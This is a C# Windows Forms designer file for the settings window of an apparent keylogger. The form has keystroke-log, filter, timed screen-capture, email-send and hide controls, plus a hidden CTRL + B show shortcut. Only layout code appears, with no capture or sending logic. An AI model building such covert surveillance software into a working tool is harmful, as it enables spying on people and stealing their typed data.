namespace KeyLogger
{
    partial class FKeyLogger
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.label3 = new System.Windows.Forms.Label();
            this.textBox1 = new System.Windows.Forms.TextBox();
            this.button_Hide = new System.Windows.Forms.Button();
            this.button_Exit = new System.Windows.Forms.Button();
            this.Image = new System.Windows.Forms.GroupBox();
            this.label1 = new System.Windows.Forms.Label();
            this.button_CaptureScreen = new System.Windows.Forms.Button();
            this.button_StopCS = new System.Windows.Forms.Button();
            this.textBox_TimeCaptureScreen = new System.Windows.Forms.TextBox();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.label6 = new System.Windows.Forms.Label();
            this.button1 = new System.Windows.Forms.Button();
            this.textBox_ToMail = new System.Windows.Forms.TextBox();
            this.button_Clean = new System.Windows.Forms.Button();
            this.button_Filter = new System.Windows.Forms.Button();
            this.label2 = new System.Windows.Forms.Label();
            this.Image.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.SuspendLayout();
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Font = new System.Drawing.Font("Microsoft Tai Le", 10.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(40, 40);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(206, 23);
            this.label3.TabIndex = 15;
            this.label3.Text = "KEYLOGGER - SETTING";
            // 
            // textBox1
            // 
            this.textBox1.BackColor = System.Drawing.SystemColors.ButtonHighlight;
            this.textBox1.Location = new System.Drawing.Point(44, 153);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new System.Drawing.Size(804, 119);
            this.textBox1.TabIndex = 16;
            // 
            // button_Hide
            // 
            this.button_Hide.Location = new System.Drawing.Point(44, 610);
            this.button_Hide.Name = "button_Hide";
            this.button_Hide.Size = new System.Drawing.Size(177, 42);
            this.button_Hide.TabIndex = 18;
            this.button_Hide.Text = "Hide";
            this.button_Hide.UseVisualStyleBackColor = true;
            this.button_Hide.Click += new System.EventHandler(this.button_Hide_Click);
            // 
            // button_Exit
            // 
            this.button_Exit.Location = new System.Drawing.Point(671, 610);
            this.button_Exit.Name = "button_Exit";
            this.button_Exit.Size = new System.Drawing.Size(177, 42);
            this.button_Exit.TabIndex = 19;
            this.button_Exit.Text = "Exit";
            this.button_Exit.UseVisualStyleBackColor = true;
            this.button_Exit.Click += new System.EventHandler(this.button_Exit_Click);
            // 
            // Image
            // 
            this.Image.Controls.Add(this.label1);
            this.Image.Controls.Add(this.button_CaptureScreen);
            this.Image.Controls.Add(this.button_StopCS);
            this.Image.Controls.Add(this.textBox_TimeCaptureScreen);
            this.Image.Location = new System.Drawing.Point(44, 292);
            this.Image.Name = "Image";
            this.Image.Size = new System.Drawing.Size(804, 143);
            this.Image.TabIndex = 21;
            this.Image.TabStop = false;
            this.Image.Text = "Image";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(20, 60);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(115, 16);
            this.label1.TabIndex = 4;
            this.label1.Text = "Time(ms)/ Image :";
            // 
            // button_CaptureScreen
            // 
            this.button_CaptureScreen.Location = new System.Drawing.Point(423, 50);
            this.button_CaptureScreen.Name = "button_CaptureScreen";
            this.button_CaptureScreen.Size = new System.Drawing.Size(177, 42);
            this.button_CaptureScreen.TabIndex = 2;
            this.button_CaptureScreen.Text = "Capture Screen";
            this.button_CaptureScreen.UseVisualStyleBackColor = true;
            this.button_CaptureScreen.Click += new System.EventHandler(this.button_CaptureScreen_Click);
            // 
            // button_StopCS
            // 
            this.button_StopCS.Location = new System.Drawing.Point(615, 50);
            this.button_StopCS.Name = "button_StopCS";
            this.button_StopCS.Size = new System.Drawing.Size(177, 42);
            this.button_StopCS.TabIndex = 9;
            this.button_StopCS.Text = "Stop";
            this.button_StopCS.UseVisualStyleBackColor = true;
            this.button_StopCS.Click += new System.EventHandler(this.button_StopCS_Click);
            // 
            // textBox_TimeCaptureScreen
            // 
            this.textBox_TimeCaptureScreen.Font = new System.Drawing.Font("Microsoft Tai Le", 10.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox_TimeCaptureScreen.Location = new System.Drawing.Point(155, 52);
            this.textBox_TimeCaptureScreen.Margin = new System.Windows.Forms.Padding(5);
            this.textBox_TimeCaptureScreen.Multiline = true;
            this.textBox_TimeCaptureScreen.Name = "textBox_TimeCaptureScreen";
            this.textBox_TimeCaptureScreen.Size = new System.Drawing.Size(240, 37);
            this.textBox_TimeCaptureScreen.TabIndex = 3;
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.label6);
            this.groupBox2.Controls.Add(this.button1);
            this.groupBox2.Controls.Add(this.textBox_ToMail);
            this.groupBox2.Location = new System.Drawing.Point(44, 450);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(804, 113);
            this.groupBox2.TabIndex = 22;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Email";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(20, 43);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(67, 16);
            this.label6.TabIndex = 7;
            this.label6.Text = "To Email :";
            // 
            // button1
            // 
            this.button1.Location = new System.Drawing.Point(423, 30);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(177, 42);
            this.button1.TabIndex = 5;
            this.button1.Text = "Send";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // textBox_ToMail
            // 
            this.textBox_ToMail.Font = new System.Drawing.Font("Microsoft Tai Le", 10.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.textBox_ToMail.Location = new System.Drawing.Point(155, 35);
            this.textBox_ToMail.Multiline = true;
            this.textBox_ToMail.Name = "textBox_ToMail";
            this.textBox_ToMail.Size = new System.Drawing.Size(240, 37);
            this.textBox_ToMail.TabIndex = 6;
            // 
            // button_Clean
            // 
            this.button_Clean.Location = new System.Drawing.Point(671, 90);
            this.button_Clean.Name = "button_Clean";
            this.button_Clean.Size = new System.Drawing.Size(177, 42);
            this.button_Clean.TabIndex = 23;
            this.button_Clean.Text = "Clean";
            this.button_Clean.UseVisualStyleBackColor = true;
            this.button_Clean.Click += new System.EventHandler(this.button_Clean_Click);
            // 
            // button_Filter
            // 
            this.button_Filter.Location = new System.Drawing.Point(467, 90);
            this.button_Filter.Name = "button_Filter";
            this.button_Filter.Size = new System.Drawing.Size(177, 42);
            this.button_Filter.TabIndex = 24;
            this.button_Filter.Text = "Filter";
            this.button_Filter.UseVisualStyleBackColor = true;
            this.button_Filter.Click += new System.EventHandler(this.button_Filter_Click);
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Microsoft Tai Le", 7.8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(720, 40);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(109, 16);
            this.label2.TabIndex = 25;
            this.label2.Text = "SHOW : CTRL + B";
            // 
            // FKeyLogger
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(899, 703);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.button_Filter);
            this.Controls.Add(this.button_Clean);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.Image);
            this.Controls.Add(this.button_Exit);
            this.Controls.Add(this.button_Hide);
            this.Controls.Add(this.textBox1);
            this.Controls.Add(this.label3);
            this.Name = "FKeyLogger";
            this.Text = "Setting";
            this.Load += new System.EventHandler(this.FKeyLogger_Load);
            this.Shown += new System.EventHandler(this.FKeyLogger_Shown);
            this.Image.ResumeLayout(false);
            this.Image.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.TextBox textBox1;
        private System.Windows.Forms.Button button_Hide;
        private System.Windows.Forms.Button button_Exit;
        private System.Windows.Forms.GroupBox Image;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Button button_CaptureScreen;
        private System.Windows.Forms.Button button_StopCS;
        private System.Windows.Forms.TextBox textBox_TimeCaptureScreen;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.TextBox textBox_ToMail;
        private System.Windows.Forms.Button button_Clean;
        private System.Windows.Forms.Button button_Filter;
        private System.Windows.Forms.Label label2;
    }
}

